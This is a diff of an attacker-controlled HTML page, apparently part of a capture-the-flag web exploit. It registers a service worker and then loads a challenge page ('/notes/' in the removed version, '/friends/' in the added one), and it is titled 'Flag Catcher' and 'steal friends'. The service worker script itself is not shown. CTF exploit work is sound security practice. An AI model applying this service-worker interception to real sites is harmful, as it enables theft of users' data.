@@ -1,23 +1,16 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <title>Flag Catcher</title>
-</head>
-<body>
-  <h1>Waiting for the flag...</h1>
-
-  <script>
-    navigator.serviceWorker.register("/sw.js").then(() => {
-      console.log("[INFO] Service worker registered.");
-
-      setTimeout(() => {
-        console.log("[INFO] Injecting iframe to load /notes/");
-        let iframe = document.createElement("iframe");
-        iframe.src = "https://fnotes-web.ctf-chal.idek.team/notes/";
-        document.body.appendChild(iframe);
-      }, 1000);
-    });
-  </script>
-</body>
+<html>
+  <head><title>steal friends</title></head>
+  <body>
+    <script>
+      navigator.serviceWorker.register("/sw.js").then(() => {
+        console.log("[INFO] Service worker registered.");
+        setTimeout(() => {
+          console.log("[INFO] Attempting fetch to /friends/");
+          fetch("/friends/");
+        }, 1000);
+      });
+    </script>
+    <h1>Waiting...</h1>
+  </body>
 </html>
